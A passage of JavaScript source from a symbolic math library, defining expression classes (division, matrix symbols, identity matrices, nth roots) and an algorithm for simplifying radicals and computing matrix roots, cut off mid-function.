  Division.prototype = Object.create(BinaryOperation.prototype);
  Division.prototype.multiply = function (y) {
    return y.multiplyDivision(this);
  };
  Expression.prototype.multiplyDivision = function (x) {
    return x.a.multiply(this).divide(x.b);
  };
  Division.prototype.multiplyDivision = function (x) { // for performance
    return x.a.multiply(this.a).divide(x.b.multiply(this.b));
  };
  Division.prototype.multiplyExpression = function (x) {
    return x.multiply(this.a).divide(this.b);
  };
  Division.prototype.add = function (y) {
    return y.addDivision(this);
  };
  Expression.prototype.addDivision = function (x) {
    return x.a.add(this.multiply(x.b)).divide(x.b);
  };
  Division.prototype.addDivision = function (x) {
    if (x.b.equals(this.b)) {
      return x.a.add(this.a).divide(this.b);
    }
    //return BinaryOperation.prototype.addDivision.call(this, x);
    return x.a.multiply(this.b).add(x.b.multiply(this.a)).divide(x.b.multiply(this.b));
  };
  Division.prototype.addExpression = function (x) {
    return x.multiply(this.b).add(this.a).divide(this.b);
  };
  Division.prototype.divide = function (y) {
    return this.a.divide(this.b.multiply(y));
  };
  Division.prototype.divideExpression = function (x) {
    return x.multiply(this.b).divide(this.a);
  };
  //? not needed, but looks appropriate
  Division.prototype.multiplyAddition = function (x) {
    return x.multiply(this.a).divide(this.b);
  };

  // TODO: move
  Expression.prototype.equals = function (b) {
    throw new RangeError();//?
  };
  Expression.prototype.equalsInteger = function (x) {
    if (this instanceof Expression.ExpressionWithPolynomialRoot || this instanceof Expression.ExpressionPolynomialRoot) {
      return this.equals(x);
    }
    return false;
  };
  var _isNumberTypeUsedForSmall = SmallBigInt.BigInt(0) === 0;
  Integer.prototype.equals = function (y) {
    // TODO: fix
    //if (y == undefined) {
    //  return false;
    //}
      if (y === Expression.ZERO) {
        if (_isNumberTypeUsedForSmall) {
          return typeof this.value === "number" && this.value === 0;
        }
      }
      if (y === Expression.ONE) {
        if (_isNumberTypeUsedForSmall) {
          return typeof this.value === "number" && this.value === 1;
        }
      }
    return y.equalsInteger(this);
  };
  Integer.prototype.equalsInteger = function (x) {
    return x.compareTo(this) === 0;
    // performance:
    //return x.value == this.value;
  };
  Expression.Symbol.prototype.equals = function (b) {
    return b instanceof Expression.Symbol && this.symbol === b.symbol;
  };
  BinaryOperation.prototype.equals = function (b) {
    if (b instanceof Addition && Expression.has(b, Expression.ExpressionPolynomialRoot)) { // not e^(alpha) or -1 * e^(alpha)
      //console.assert(false, '!!!');
      return this.subtract(b).equals(Expression.ZERO);
    }
    if (b instanceof Addition && this instanceof Multiplication && Expression.has(this, Expression.ExpressionPolynomialRoot) ||
        this instanceof Addition && b instanceof Multiplication && Expression.has(b, Expression.ExpressionPolynomialRoot)) { // alpha * x and sqrt(2) * x + sqrt(3) * x
      //console.assert(false, '!!!');
      return this.subtract(b).equals(Expression.ZERO);
    }
    if (this instanceof Addition && b instanceof Addition) {
      //HACK TO not call Expression.has each time!!! (three lines before)
      var x = this;
      var y = b;
      var i = x.summands();
      var j = y.summands();
      var a = i.next().value;
      var b = j.next().value;
      while (a != null && b != null) {
        if (!a.equals(b)) {
          return false;
        }
        a = i.next().value;
        b = j.next().value;
      }
      return a != null ? false : (b != null ? false : true);
    }
    if (b instanceof Expression.ExpressionWithPolynomialRoot || b instanceof Expression.ExpressionPolynomialRoot) {
      //console.assert(false, '!!!');
      return b.equals(this);
    }
    return b instanceof BinaryOperation && this.getS() === b.getS() && this.a.equals(b.a) && this.b.equals(b.b);
  };

  function MatrixSymbol(symbol) {//TODO: only for square matrix !!!
    Expression.Symbol.call(this, symbol);
  }
  MatrixSymbol.prototype = Object.create(Expression.Symbol.prototype);

  Exponentiation.prototype.inverse = function () {
    return this.pow(Expression.ONE.negate());
  };
  MatrixSymbol.prototype.inverse = function () {//TODO: only for square matrix !!!
    return this.pow(Expression.ONE.negate());
  };
  MatrixSymbol.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationMatrixSymbol(this);
  };
  Expression.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    return +1;
  };
  Addition.prototype.compare4MultiplicationMatrixSymbol = function (x) { // (X+{{1}})*X
    return -1;
  };
  Expression.Matrix.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    return x instanceof IdentityMatrix ? +1 : -1;//?
  };
  MatrixSymbol.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    var c = Expression.Symbol.prototype.compare4MultiplicationSymbol.call(this, x);
    return c === +1 ? -1 : c;
  };
  MatrixSymbol.prototype.compare4MultiplicationSymbol = function (x) {
    return -1;
  };
  MatrixSymbol.prototype.equals = function (b) {
    return b instanceof MatrixSymbol && Expression.Symbol.prototype.equals.call(this, b);
  };
  MatrixSymbol.prototype.transpose = function () {
    // quick solution:
    return new Expression.Exponentiation(this, new Expression.Symbol("T")); // TODO: fix
  };
  //...

  Expression.MatrixSymbol = MatrixSymbol;

  function IdentityMatrix(symbol) {
    MatrixSymbol.call(this, symbol);
  }
  IdentityMatrix.prototype = Object.create(MatrixSymbol.prototype);
  //IdentityMatrix.prototype.multiply = function (y) {
  //  return y.multiplyIdentityMatrix(this);
  //};

  //TODO: move to MatrixSymbol - ?
  IdentityMatrix.prototype.multiplyAddition = function (x) {
    if (isScalar(x)) {
      return new Multiplication(x, this);
    }
    return Expression.prototype.multiplyAddition.call(this, x);
  };

  //Expression.prototype.multiplyIdentityMatrix = function (x) {
  //  return this.multiplyExpression(x);
  //};
  //IdentityMatrix.prototype.multiplyIdentityMatrix = function (x) {
  //  return new IdentityMatrix(this.symbol);
  //};
  IdentityMatrix.prototype.addMatrix = function (x) {
    return x.add(new Expression.Matrix(Matrix.I(x.matrix.rows())));
  };
  IdentityMatrix.prototype.add = function (y) {
    return y.addIdentityMatrix(this);
  };
  Expression.prototype.addIdentityMatrix = function (x) {
    return this.addExpression(x);//?
  };
  Expression.Matrix.prototype.addIdentityMatrix = function (x) {
    return new Expression.Matrix(Matrix.I(this.matrix.rows())).add(this);
  };

  IdentityMatrix.prototype.multiplyDivision = function (x) {
    if (isScalar(x)) {
      return new Multiplication(x, this);
    }
    return Expression.prototype.multiplyExpression.call(this, x);
  };

  IdentityMatrix.prototype.compare4MultiplicationMatrixSymbol = function (x) {
    var y = this;
    return x instanceof IdentityMatrix ? (x.symbol < y.symbol ? -1 : (y.symbol < x.symbol ? +1 : 0)) : +1;
  };

  Expression.IdentityMatrix = IdentityMatrix;

  BinaryOperation.prototype.getS = function () {
    throw new TypeError("abstract");
  };
  Exponentiation.prototype.getS = function () {
    return "^";
  };
  Multiplication.prototype.getS = function () {
    return "*";
  };
  Negation.prototype.getS = function () {
    return "-";
  };
  Addition.prototype.getS = function () {
    return "+";
  };
  Division.prototype.getS = function () {
    return "/";
  };

  // unary argument function, fix Expression.Function#compare4Addition for multiple argument functions (!)
  Expression.Function = function (name, a) {
    //Expression.call(this);
    this.name = name;
    this.a = a;
  };
  Expression.Function.prototype = Object.create(Expression.prototype);
  Expression.Function.prototype.toString = function (options) {
    //?
    return this.name + "(" + this.a.toString(setTopLevel(true, options)) + ")";
  };
  Expression.Function.prototype.equals = function (b) {
    return b instanceof Expression.Function && this.name === b.name && this.a.equals(b.a);
  };

  Negation.prototype.isUnaryPlusMinus = function () {
    return true;
  };
  BinaryOperation.prototype.isUnaryPlusMinus = function () {
    return this.isNegation();
  };
  Expression.Function.prototype.isUnaryPlusMinus = function () {
    return false;//!
  };
  Expression.prototype.isUnaryPlusMinus = function () {
    return false;
  };
  Integer.prototype.isUnaryPlusMinus = function () {//?
    return this.compareTo(Expression.ZERO) < 0;
  };

  Negation.prototype.getPrecedence = function () {
    return precedence.unary["-"];
  };
  BinaryOperation.prototype.getPrecedence = function () {
    return this.isNegation() ? precedence.unary["-"] : precedence.binary[this.getS()];
  };
  Expression.Function.prototype.getPrecedence = function () {
    return precedence.unary["-"];
  };
  Expression.prototype.getPrecedence = function () {
    return 1000;
  };
  Integer.prototype.getPrecedence = function () {//?
    return this.compareTo(Expression.ZERO) < 0 ? precedence.unary["-"] : 1000;
  };

  //! Note: this function is more for canonical order(?) or output(?), to check if a numeric expression is negative you should use Expression#sign()
  Expression.prototype.isNegative = function () {
    var x = this;
    if (x instanceof Integer) {
      return x.compareTo(Expression.ZERO) < 0;
    }
    if (x instanceof Expression.Complex) {
      return x.real.compareTo(Expression.ZERO) < 0 || (x.real.compareTo(Expression.ZERO) === 0 && x.imaginary.compareTo(Expression.ZERO) < 0);
    }
    if (x instanceof Addition) {
      var e = x;
      do {
        e = e.a;
      } while (e instanceof Addition);
      return e.isNegative();
      //return x.a.isNegative();
      //return x.a.isNegative() && x.b.isNegative();
    }
    if (x instanceof Multiplication) {
      return x.a.isNegative() !== x.b.isNegative();
    }
    if (x instanceof Division) {
      return x.a.isNegative() !== x.b.isNegative();
    }
    if (x instanceof Negation) {
      //return !x.b.isNegative();
      return true;
    }
    if (x instanceof Expression.Radians) {
      return x.value.isNegative();
    }
    return false;
  };

  //TODO: remove
  Expression.prototype.negateCarefully = function () {
    if (this instanceof Integer) {
      return this.negate();
    }
    if (this instanceof Addition) {
      return new Addition(this.a.negateCarefully(), this.b.negateCarefully());
    }
    if (this instanceof Multiplication) {
      return this.b.isNegative() ? new Multiplication(this.a, this.b.negateCarefully()) : (this.a.negateCarefully().equals(Expression.ONE) ? this.b : new Multiplication(this.a.negateCarefully(), this.b));
    }
    if (this instanceof Division) {
      return this.b.isNegative() ? new Division(this.a, this.b.negateCarefully()) : new Division(this.a.negateCarefully(), this.b);
    }
    if (this instanceof Negation) {
      return this.b;//!
    }
    return this.negate();
  };

  // https://en.wikipedia.org/wiki/Nth_root#Simplified_form_of_a_radical_expression
  // https://en.wikipedia.org/wiki/Factorization#Sum.2Fdifference_of_two_cubes

  function NthRoot(name, a, n) {
    Expression.Function.call(this, name, a);
    this.n = n;//TODO: remove
    this.degree = n;
    this.radicand = a;
    //this.index = n;
    console.assert(name === (n === 2 ? "sqrt" : n + "-root")); // otherwise it is not unary argument function (!)
  }

  NthRoot.prototype = Object.create(Expression.Function.prototype);

  NthRoot.prototype.compare4Multiplication = function (y) {
    return y.compare4MultiplicationNthRoot(this);
  };
  NthRoot.prototype.compare4MultiplicationInteger = function (x) {
    return -1;
  };
  NthRoot.prototype.compare4MultiplicationSymbol = function (x) {
    return +1;
  };
  NthRoot.prototype.compare4MultiplicationNthRoot = function (x) {
    return x.n < this.n ? -1 : (x.n > this.n ? + 1 : 0);
  };

  NthRoot.prototype.toString = function (options) {
    var fa = this.a.getPrecedence() <= this.getPrecedence();
    return (fa ? "(" : "") + this.a.toString(setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? ")" : "") + "^" + (this.n === 2 ? "0.5" : "(1/" + this.n + ")");
  };

  var isCommutative = function (e) {
    return !Expression.has(e, Expression.Matrix) && !Expression.has(e, Expression.MatrixSymbol);
  };

  NthRoot.prototype.getDegree = function () {
    console.error('deprecated');
    return this.n;
  };
  NthRoot.prototype.multiplyExpression = function (x) {
    if (x instanceof Multiplication && isCommutative(this) && this.a instanceof Expression.Integer) {//TODO: fix
      for (var iteratory = x.factors()[globalThis.Symbol.iterator](), y = iteratory.next().value; y != null; y = iteratory.next().value) {
        if (y instanceof NthRoot && y.a instanceof Expression.Integer && compare4Multiplication2(y, this) === 0) {
          var multiplied = false;
          var result = Expression.ONE;
          for (var iteratory1 = x.factors()[globalThis.Symbol.iterator](), y1 = iteratory1.next().value; y1 != null; y1 = iteratory1.next().value) {
            var y2 = y1;
            if (!multiplied && y === y1) {
              y2 = y.multiply(this);
              multiplied = true;
            }
            result = result.multiply(y2);
          }
          return result;
        }
      }
    }
    return Expression.prototype.multiplyExpression.call(this, x);
  };

  NthRoot.prototype.equals = function (b) {
    if (b instanceof Expression.ExpressionWithPolynomialRoot || b instanceof Expression.ExpressionPolynomialRoot) {
      return b.equals(this);
    }
    return Expression.Function.prototype.equals.call(this, b);
  };

  //function isPrime(n) {
    //if (typeof n === "bigint") {//TODO: ?
    //  return n === BigInt(primeFactor(BigInt(n.toString())).toString());
    //}
    //return n == primeFactor(n);
  //}

  function isPerfectCube(n) {
    return SmallBigInt.toNumber(SmallBigInt.subtract(SmallBigInt.exponentiate(n._integerNthRoot(3).toBigInt(), SmallBigInt.BigInt(3)), n.toBigInt())) === 0;
  }
  function isPerfectSquare(n) {
    return SmallBigInt.toNumber(SmallBigInt.subtract(SmallBigInt.exponentiate(n._integerNthRoot(2).toBigInt(), SmallBigInt.BigInt(2)), n.toBigInt())) === 0;
  }
  var makeRoot = function (i, n) {
    return n === 1 ? i : (n === 2 ? new SquareRoot(i) : new NthRoot(n + "-root", i, n));
  };
  NthRoot.makeRoot = makeRoot;

  Expression.prototype._nthRoot = function (n) {
    if (typeof n === "number") {
      if (n < 1 || n > Number.MAX_SAFE_INTEGER || Math.floor(n) !== n) {
        throw new RangeError("NotSupportedError");
      }
    } else {
      if (!(this instanceof Expression.Matrix)) {
        throw new RangeError("NotSupportedError");
      }
    }
    var x = this;

    if (n === 2) {
      if (x instanceof Addition) {
        if ((x.a instanceof SquareRoot || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) && x.b instanceof Integer) {
          // (5^0.5+3)/2 or (-5^0.5+3)/2
          var u = x.a;
          var v = x.b;
          // (a+b)^2 = aa+2ab+bb = u+v
          // 2ab = u, b = u/(2a)
          // aa+bb = v, 4aaaa - 4vaa + uu = 0
          // t = sqrt(v*v-u*u);
          // a = sqrt(v+t)/sqrt(2)
          // b = sqrt(v-t)/sqrt(2)
          var tt = v.multiply(v).subtract(u.multiply(u));
          if (tt instanceof Integer && !isPerfectSquare(tt.abs())) {
            tt = null;
          }
          var t = tt instanceof Integer && tt.compareTo(Expression.ZERO) >= 0 ? tt.squareRoot() : undefined;
          if (t != undefined && (t instanceof Integer)) {//?
            var aa = v.add(t);
            var a = aa.compareTo(Expression.ZERO) >= 0 ? aa.squareRoot().divide(Expression.TWO.squareRoot()) : undefined;
            if (a != undefined) {
              var b = u.divide(Expression.TWO.multiply(a));
              return a.add(b);
            }
          }
        }
        //TODO: https://brownmath.com/alge/nestrad.htm  - âˆš(âˆš392 + âˆš360)
        if ((x.a instanceof SquareRoot || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) &&
            (x.b instanceof SquareRoot || x.b instanceof Multiplication && x.b.a instanceof Integer && x.b.b instanceof SquareRoot)) {
          var a = x.a;
          var b = x.b;
          var aa = a.multiply(a);
          var bb = b.multiply(b);
          var g = aa.gcd(bb).squareRoot();
          if (!g.equals(Expression.ONE)) {
            var v = a.divide(g).add(b.divide(g)).squareRoot().multiply(g.squareRoot());
            if (typeof hit === "function") {
              hit({rootFromAddition: x.toString()});
            }
            return v;
          }
        }
        if (Expression._isPositive(x)) {//?
          var tmp = getConjugateFactor(x);
          if (tmp.p != null) {
            var t = tmp.p.toExpression()._nthRoot(tmp.degree);
            var polynomial = getPolynomialRelativeToNthRoot(x, tmp.p, tmp.degree);
            var u = polynomial.getCoefficient(1).multiply(t.toExpression());
            var v = polynomial.getCoefficient(0);
            var D = v.multiply(v).subtract(u.multiply(u));
            var f1 = function (aa) {
              var tmp = aa.divide(getConstant(aa));
              var c = Expression.getConjugate(tmp);
              return c != null && c.multiply(tmp) instanceof Integer && isPerfectSquare(c.multiply(tmp).abs());
            };
            if (D instanceof Integer || f1(D)) {//TODO: FIX
              var sD = D.squareRoot();
              var aa = v.add(sD);
              if (aa instanceof Integer || f1(aa)) {
                //console.log('aa', aa + '');
                var a = aa.squareRoot().divide(Expression.TWO.squareRoot());
                var b = u.divide(Expression.TWO.multiply(a));
                return a.add(b);
              }
            }
          }
        } else if (Expression._isPositive(x.negate()) && n === 2) {
          return Expression.I.multiply(x.negate()._nthRoot(2));
        }
      }
    }
    if (n === 3) {//? new: 2019-08-18
      if (x instanceof Addition) {
        if ((x.a instanceof SquareRoot && x.a.a instanceof Integer || x.a instanceof Multiplication && x.a.a instanceof Integer && x.a.b instanceof SquareRoot) && x.b instanceof Integer) {
          // (5^0.5+3)/2 or (-5^0.5+3)/2
          var u = x.a;
          var v = x.b;
          var d = u.multiply(u).subtract(v.multiply(v));
          if (isPerfectCube(d)) {//?
            // (a+b)^3 = aaa+3aab+3bba+bbb = u+v
            // aaa+3bba = v, bb=(v-aaa)/(3a)
            // 3aab+bbb = u, b(3aa+bb)=u, b=u/(3aa+bb), bb=u**2/(3aa+bb)**2
            // (9aaa+(v-aaa))**2*(v-aaa) = 27*aaa*u**2

            // t = aaa
            // (9t+(v-t))**2*(v-t) = 27*t*u**2

            var t = new Expression.Symbol('t');
            //var eq = ExpressionParser.parse('(9t+(v-t))**2*(v-t) - 27*t*u**2', new ExpressionParser.Context(function (id) {
            //  return id === 'v' ? v : (id === 'u' ? u : (id === 't' ? t : undefined));
            //})).simplify();
            var NINE = Expression.Integer.fromNumber(9);
            var TWENTY_SEVEN = Expression.Integer.fromNumber(27);
            var eq = Expression.pow(NINE.multiply(t).add(v.subtract(t)), 2).multiply(v.subtract(t)).subtract(TWENTY_SEVEN.multiply(t).multiply(Expression.pow(u, 2)));
            var p = Polynomial.toPolynomial(eq, t);
            p = p.scale(p.getContent().inverse());
            var t = p.doRationalRootTest();
            if (t != null) {
              var a = t._nthRoot(3);
              var b = u.divide(u.abs()).multiply(v.subtract(t).divide(Expression.Integer.fromNumber(3).multiply(a))._nthRoot(2));
              return a.add(b);
            }
          }
        }
      }
    }

    //?
    if (x instanceof NthRoot) {
      if (typeof hit === "function") {
        hit({rootFromRoot: ""});
      }
      return x.a._nthRoot(x.n * n);
    }
    if (x instanceof Division || x instanceof Multiplication) {
      if (n % 2 !== 0 || x.a instanceof Integer && x.a.compareTo(Expression.ZERO) > 0 || // sqrt(-x) = sqrt(-1 * -1) = i * i = -1
                         x.b instanceof Integer && x.b.compareTo(Expression.ZERO) > 0 || //TODO: fix
                         x.a instanceof Integer && isConstant(x.b) ||
                         isConstant(x) ||
                         isPositive(x.a) ||
                         isPositive(x.b) || // -sqrt(7)
                         //isPositive(x.a.negate()) ||
                         isPositive(x.b.negate())) {
        if (x instanceof Division) {
          return x.a._nthRoot(n).divide(x.b._nthRoot(n));
        }
        if (x instanceof Multiplication) {
          return x.a._nthRoot(n).multiply(x.b._nthRoot(n));
        }
      }
    }
    var qi = x instanceof Integer ? x : null;
    var qq = QuadraticInteger.toQuadraticInteger(x);
    // sqrt(2sqrt(2)+2) "(2*2^0.5+2)^0.5"
    // sqrt(sqrt(2)+2) "(2^0.5+1)^0.5*2^(1/4)"
    // sqrt(4sqrt(2)+4) 2*(2^0.5+1)^0.5
    // sqrt(2sqrt(2)+4) (2*2^0.5+2)^0.5*2^(1/4)

    //TODO: fix for !isPrime(qq.D)
    //if (qq != null && (isPrime(qq.D) && (qq.a / Math.gcd(qq.a, qq.b)) % qq.D == 0 || !isPrime(qq.D) && qq.a % qq.D == 0 && Math.gcd(qq.a, qq.b) % qq.D != 0)) {
      //var D = Expression.Integer.fromNumber(qq.D)._nthRoot(2);
      //return D._nthRoot(n).multiply(x.divide(D)._nthRoot(n));
    //}

    //!
    if (qq == null && x instanceof Expression.Addition) {
      if (x.a instanceof Multiplication && x.b instanceof Multiplication) {
        var g = x.a.pow(Expression.TWO).gcd(x.b.pow(Expression.TWO)).squareRoot();
        if (!g.equals(Expression.ONE)) {
          return g._nthRoot(n).multiply(x.divide(g)._nthRoot(n));
        }
      }
    }
    //!

    if (qq != null) {
      if (n !== 2 && n % 2 === 0) {
        //TODO: check
        var tmp = x.squareRoot();
        if (!(tmp instanceof Expression.SquareRoot)) {
          return tmp._nthRoot(n / 2);
        }
      }
      if ((n === 2 || n === 3) && qq.isValid()) {//Note: isValid should be checked here
      //if (qq.norm() === -1 * Math.pow(Math.gcd(qq.a, qq.b), 2)) {
        if (qq.isPositive()) {
        qi = qq;
        //!new 2020-12-31
        if (qq.norm != null && Math.abs(Number(qq.norm().toString())) > Number.MAX_SAFE_INTEGER) {
          qi = null;//!
        }
        //!
        } else {
          return Expression.ONE.negate()._nthRoot(n).multiply(this.negate()._nthRoot(n));
        }
      //}
      }
    }
    if (qi != null) {
      x = qi;//TODO:
      if (x instanceof Integer && x.compareTo(Expression.ZERO) < 0) {
        if (n % 2 === 0) {
          if (n === 2) {//TODO: ?
            return Expression.I.multiply(this.negate()._nthRoot(n));
          }
          throw new RangeError("NotSupportedError");
        }
        return this.negate()._nthRoot(n).negate();
      }
      if (x.equals(Expression.ZERO)) {
        return this;
      }
      var roots = [];
      var i = x;
      while (!i.equals(Expression.ONE)) {
        var d = i.primeFactor();
        if (d instanceof QuadraticInteger) {
          if (n !== 2 && n !== 3) {
            throw new TypeError(); // "assertion"
          }
          //if (Math.abs(Number(d.norm().toString())) === 1) {//!new
          //TODO: why is it here?
          // sqrt(sqrt(2)-1) = (sqrt(2)-1)*sqrt(sqrt(2)+1)
          if (Number(d.a.toString()) < 0 && Number(d.b.toString()) > 0 || Number(d.a.toString()) > 0 && Number(d.b.toString()) < 0) {
            var a = (n % 2 === 0 ? d.abs() : d);
            return x.toExpression().divide(a.toExpression()._pow(n))._nthRoot(n).multiply(a.toExpression());
          }
          //}
          var s = d.norm();
          // https://brownmath.com/alge/nestrad.htm#SurveyDoable
          //TODO: s >= 0 - ?
          if (Number(d.b.toString()) !== 0 && Number(d.a.toString()) !== 0 && Number(s.toString()) >= 0 && isPerfectSquare(Integer.fromBigInt(s))) {
            if (n === 2) {
            return x.toExpression().divide(d.toExpression())._nthRoot(2).multiply(d.toExpression()._nthRoot(2));
            }
          }
        }
        var ctz = i instanceof Expression.Integer && d instanceof Expression.Integer ? primeFactor._countTrailingZeros(i.value, d.value) : -1;
        var e = 0;
        if (ctz !== -1) {
          e = ctz;
          i = i.truncatingDivide(d._pow(ctz));
        } else {
        if (i.isUnit()) {
          //TODO:
          // d should be a https://en.wikipedia.org/wiki/Fundamental_unit_(number_theory)
          while (!i.equals(Expression.ONE)) {
            i = i.truncatingDivide(d);
            e += 1;
          }
        } else {
          while (i.isDivisibleBy(d)) {
            i = i.truncatingDivide(d);
            e += 1;
          }
        }
        }
        //if (ctz !== -1) {
        //  console.assert(ctz === e);
        //}
        d = d.toExpression();
        var nn = n;
        if (d instanceof NthRoot) {
          nn *= d.n;
          d = d.a;
        }
        var t = Math.gcd(nn, e);
        nn /= t;//?
        e /= t;//?

        while (e !== 0) {
          //var g = e;
          //while (nn % g !== 0) {
          //  g -= 1;
          //}
          var g = e >= nn ? nn : 1;

          var e1 = Math.floor(e / g);
          var k = Math.floor(nn / g);
          roots.push(Object.freeze({
            degree: k,
            radicand: Expression.pow(d, e1)
          }));

          e = e - g * e1; // e = e % g;
        }
      }
      var y = Expression.ONE;
      roots.sort(function (a, b) { return a.degree - b.degree; });
      var k = -1;
      for (var i = 0; i < roots.length; i += 1) {
        if (k === -1 || roots[i].degree !== roots[k].degree) {
          k += 1;
          roots[k] = roots[i];
        } else {
          roots[k] = Object.freeze({
            degree: roots[i].degree,
            radicand: roots[k].radicand.multiply(roots[i].radicand)
          });
        }
      }
      roots.length = k + 1;
      //for (var j = 1; j <= n; j += 1) {
      //}
      // `for-in` loop is used to have better performance for "a sparse array"
      var f = null;
      for (var jj = 0; jj < roots.length; jj += 1) {//TODO: fix the iteration order
          var degree = roots[jj].degree;
        if (degree !== 1) {
          var radicand = roots[jj].radicand;
          //y = y.multiply(makeRoot(radicand, j));
          var x = makeRoot(radicand, degree);
          if (y !== Expression.ONE) {
            y = new Expression.Multiplication(y, x);
          } else {
            y = x;
          }
        } else {
          f = roots[jj].radicand;
        }
      }
      if (f != null) {
        y = f.multiply(y);
      }
      return y;
    }
    if (x instanceof Expression.Matrix) {
      if (typeof hit === "function") {
        hit(n === 2 ? {squareRoot: "matrix"} : {nthRoot: "Matrix^(1/" + n + ")"});
      }
      var eigenvalues = Expression.getEigenvalues(x.matrix);
      var N = typeof n === "number" ? Expression.Integer.fromNumber(n) : n;
      if (eigenvalues.length === x.matrix.cols()) {
        var eigenvectors = Expression.getEigenvectors(x.matrix, eigenvalues);
        if (eigenvectors.filter(function (v) { return v != null; }).length === x.matrix.cols()) {
          if (!x.matrix.isDiagonal()) {
            if (Expression.callback != undefined) {
              Expression.callback(new Expression.Event("nth-root-using-diagonalization", x));
            }
            if (Expression.callback != undefined) {//TODO: remove - ?
              Expression.callback(new Expression.Event("diagonalize", x));
            }
          }
          var tmp = Expression.diagonalize(x.matrix, eigenvalues, eigenvectors);
          var L = tmp.L;
          var SL = L.map(function (e, i, j) {
            return i === j ? e.pow(Expression.ONE.divide(N)) : e;
          });
          return new Expression.Matrix(tmp.T.multiply(SL).multiply(tmp.T_INVERSED));
        } else {
          if (!x.matrix.isJordanMatrix()) {
            if (Expression.callback != undefined) {
              Expression.callback(new Expression.Event("nth-root-using-Jordan-normal-form", x));
            }
            if (Expression.callback != undefined) {//TODO: remove - ?
              Expression.callback(new Expression.Event("Jordan-decomposition", x));
            }
          } else {
            if (Expression.callback != undefined) {
              Expression.callback(new Expression.Event("Jordan-matrix-nth-root", x));
            }
          }
          var rootOfJordanForm = function (J, N) {
            var tmp = J.map(function (e, i, j) {
              if (i > j) {
                return Expression.ZERO;
              }
              if (i === j) {
                return J.e(i, j).pow(Expression.ONE.divide(N));
              }
              if (J.e(i, i + 1).equals(Expression.ZERO)) {
                return Expression.ZERO;
              }
              if (!J.e(i, i + 1).equals(Expression.ONE)) {
                throw new TypeError("assertion");
              }
              //if (i + 1 === j) {
                //return J.e(i, i).pow(Expression.ONE.divide(N)).divide(N.multiply(J.e(i, i)));
                //return J.e(i, i + 1).divide(N.multiply(J.e(i, i).pow(Expression.ONE.divide(N)).pow(N.subtract(Expression.ONE))));
              //}
              //return new Expression.Symbol('aa_(' + (j - i) + ',' + j + ')');
              var m = j - i;
              for (var k = 0; k < m; k += 1) {
                if (!J.e(j - 1 - k, j - k).equals(Expression.ONE)) { // outside of a block
                  return Expression.ZERO;
                }
              }
              // 1/n(1/n-1)(1/n-2)(1/n-3)/(4!*Î»**4) * Î»**(1/n)
              var f = Expression.ONE;
              for (var k = 0; k < m; k += 1) {
                f = f.multiply(Expression.ONE.divide(N).subtract(Expression.Integer.fromNumber(k))).divide(Expression.Integer.fromNumber(k + 1));
              }
              return f.divide(J.e(i, i)._pow(m)).multiply(J.e(i, i).pow(Expression.ONE.divide(N)));
            });

            /*
            for (var k = 2; k < J.cols(); k += 1) {
              //var x = tmp.pow(N);
              var x = new Expression.Matrix(tmp).pow(N).matrix;//!?
              tmp = tmp.map(function (e, i, j) {
                if (i + k === j) {
                  if (x.e(i, j).equals(Expression.ZERO)) {
                    return Expression.ZERO;
                  }
                  var s = new Expression.Symbol('aa_(' + (j - i) + ',' + j + ')');
                  var p = Polynomial.toPolynomial(x.e(i, j).getNumerator(), s);
                  if (p.getDegree() === 0) {
                    return x.e(i, j);
                  }
                  if (p.getDegree() !== 1) {
                    throw new TypeError("!");
                  }
                  var y = p.getCoefficient(0).negate().divide(p.getCoefficient(1));
                  return y;
                }
                return e;
              });
            }
            */
            return tmp;
          };
          var tmp = Expression.getFormaDeJordan(x.matrix, eigenvalues);
          var JN = rootOfJordanForm(tmp.J, N);
          //TODO: details - ?
          return new Expression.Matrix(tmp.P.multiply(JN).multiply(tmp.P_INVERSED));
        }
      }
      //TODO: using Jordan normal form -?
    }
    //!2019-04-22
    if (x instanceof Exponentiation && x.a instanceof Integer && x.a.compareTo(Expression.ZERO) > 0) {
      //if (n === 2) {//TODO:
        if (x.b instanceof Expression.Symbol) {
          if (x.a instanceof Expression.Integer && integerPrimeFactor(x.a).equals(x.a)) {
            //return new SquareRoot(x);
            return new Expression.Exponentiation(x.a, x.b.divide(Expression.Integer.fromNumber(n)));
          }
        } else {
          return x.a.pow(x.b.divide(Expression.Integer.fromNumber(n)));
        }
      //}
    }

    //!2019-16-06
    if (x instanceof Exponentiation && x.a === Expression.E) {
      return x.a.pow(x.b.divide(Expression.Integer.fromNumber(n)));
    }
    if (x instanceof Exponentiation && getBase(x) instanceof Expression.Logarithm && getBase(x).a instanceof Expression.Integer) {//TODO: ?
      return x.a.pow(x.b.divide(Expression.Integer.fromNumber(n)));
    }
    if (x instanceof IdentityMatrix) {
      if (simplifyIdentityMatrixPower) {
        return x;
      }
    }
    //!2019-17-06
    if (x instanceof Expression.Symbol) {
      return new Expression.Exponentiation(x, Expression.ONE.divide(Expression.Integer.fromNumber(n)));
    }
    if (x instanceof Exponentiation &&
        (x.a instanceof Expression.Symbol || isGoodPolynomial(x.a)) &&
        (n % 2 === 1 || (x.b.getNumerator() instanceof Integer && x.b.getNumerator().remainder(Expression.TWO).equals(Expression.ONE)))) {
      //TODO: fix condition for n % 2 === 0
      var b = x.b.divide(Expression.Integer.fromNumber(n));
      return b.equals(Expression.ONE) ? x.a : new Expression.Exponentiation(x.a, b);
    }

    //!2019-06-20
    //var v = getVariable(x);
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(x))).next().value.v; // avoid square roots
    if (v instanceof Expression.Symbol || (v instanceof Expression.Logarithm && v.a instanceof Expression.Integer) && (n === 2 || n === 3 || true)) {//TODO: other n's
      var p = Polynomial.toPolynomial(x, v);
      var c = p.getContent();
      if (c.isNegative()) {
        c = c.negate();
      }
      if (isPositive(c) && !c.equals(Expression.ONE)) {
        return x.divide(c)._nthRoot(n).multiply(c._nthRoot(n));
      }
      if (p.getDegree() === 1 && p.getCoefficient(0) instanceof Integer && !p.getCoefficient(0).equals(Expression.ZERO) && p.getCoefficient(1) instanceof Integer) {
        //TODO:
        if (p.getCoefficient(1).compareTo(Expression.ZERO) > 0) {
          var N = n instanceof Expression.Symbol ? n : Expression.Integer.fromNumber(n);//TODO: ?
